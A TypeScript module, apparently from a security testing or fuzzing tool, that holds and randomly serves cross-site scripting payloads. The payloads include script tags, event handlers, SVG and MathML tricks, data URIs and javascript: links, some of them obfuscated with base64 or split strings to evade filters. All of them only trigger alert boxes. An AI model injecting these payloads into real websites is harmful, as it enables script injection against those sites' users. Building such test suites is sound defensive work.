/**
 * XSS Vector Strategy
 * 
 * Generates cross-site scripting (XSS) attack vectors.
 * Tests for: reflected XSS, stored XSS, DOM-based XSS, event handlers.
 */

export interface XssPayload {
  type: 'SCRIPT' | 'EVENT_HANDLER' | 'SVG' | 'DATA_URI' | 'FORM_ACTION';
  vector: string;
  description: string;
}

/**
 * Classic script injection vectors
 */
const SCRIPT_VECTORS = [
  '<script>alert(String.fromCharCode(88,83,83))</script>',
  '<script>alert(document.domain)</script>',
  '<script>alert(1)</script>',
  '<scr<script>ipt>alert(1)</</scr<script>ipt>',
  '<SCript>alert(1)</SCript>',
  '<SCRIPT>alert("XSS")</SCRIPT>',
  '<script>eval(atob("YWxlcnQoIlhTUyIp"))</script>',
  '<script>Function("alert(1)")()</script>',
];

/**
 * Event handler based vectors 
 */
const EVENT_HANDLER_VECTORS = [
  '<img src=x onerror=alert(1)>',
  '<img src=x onerror=alert(document.domain)>',
  '<svg onload=alert(1)>',
  '<svg onload=alert(document.domain)>',
  '<body onload=alert(1)>',
  '<input onfocus=alert(1) autofocus>',
  '<select onfocus=alert(1) autofocus>',
  '<textarea onfocus=alert(1) autofocus>',
  '<keygen onfocus=alert(1) autofocus>',
  '<video><source onerror="alert(1)">',
  '<audio><source onerror="alert(1)">',
  '<details open ontoggle=alert(1)>',
  '<marquee onstart=alert(1)>',
  '<object data="javascript:alert(1)">',
  '<embed src="javascript:alert(1)">',
];

/**
 * SVG-based vectors
 */
const SVG_VECTORS = [
  '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
  '<svg><script>alert(1)</script></svg>',
  '<svg><g onload=alert(1)>',
  '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
  '<math><mtext><table><mg><mg onload=alert(1)>',
  '<math><mtext><mg><mg onmouseover=alert(1)>',
];

/**
 * Data URI vectors
 */
const DATA_URI_VECTORS = [
  'data:text/html,<script>alert(1)</script>',
  'data:text/html,<img src=x onerror=alert(1)>',
  'data:text/vndpc+html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
  'data:,alert(1)',
  'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=',
];

/**
 * Form action / JavaScript protocol vectors
 */
const FORM_ACTION_VECTORS = [
  'javascript:alert(1)',
  'javascript:alert(document.domain)',
  'vbscript:msgbox(1)',
  'javascript:eval("aler"+"t(1)")',
  '<a href="javascript:alert(1)">click</a>',
  '<form action="javascript:alert(1)"><input type="submit"></form>',
  '<iframe src="javascript:alert(1)">',
];

/**
 * Generates an XSS attack payload.
 * @returns An XssPayload with attack vector
 */
export function generateXssPayload(): XssPayload {
  const rand = Math.random();
  let payload: XssPayload;

  if (rand < 0.25) {
    const vector = SCRIPT_VECTORS[Math.floor(Math.random() * SCRIPT_VECTORS.length)];
    payload = { type: 'SCRIPT', vector, description: 'Script tag injection' };
  } else if (rand < 0.5) {
    const vector = EVENT_HANDLER_VECTORS[Math.floor(Math.random() * EVENT_HANDLER_VECTORS.length)];
    payload = { type: 'EVENT_HANDLER', vector, description: 'Event handler injection' };
  } else if (rand < 0.7) {
    const vector = SVG_VECTORS[Math.floor(Math.random() * SVG_VECTORS.length)];
    payload = { type: 'SVG', vector, description: 'SVG-based injection' };
  } else if (rand < 0.85) {
    const vector = DATA_URI_VECTORS[Math.floor(Math.random() * DATA_URI_VECTORS.length)];
    payload = { type: 'DATA_URI', vector, description: 'Data URI injection' };
  } else {
    const vector = FORM_ACTION_VECTORS[Math.floor(Math.random() * FORM_ACTION_VECTORS.length)];
    payload = { type: 'FORM_ACTION', vector, description: 'Form action / JS protocol' };
  }

  return payload;
}

/**
 * Gets all XSS vectors as an array.
 * @returns Array of attack vectors
 */
export function getAllXssVectors(): string[] {
  return [
    ...SCRIPT_VECTORS,
    ...EVENT_HANDLER_VECTORS,
    ...SVG_VECTORS,
    ...DATA_URI_VECTORS,
    ...FORM_ACTION_VECTORS,
  ];
}

/**
 * Checks if a string value is a known XSS vector.
 * @param value The value to check
 * @returns true if value is a known XSS vector
 */
export function isXssVector(value: string): boolean {
  return getAllXssVectors().includes(value);
}

export default generateXssPayload;
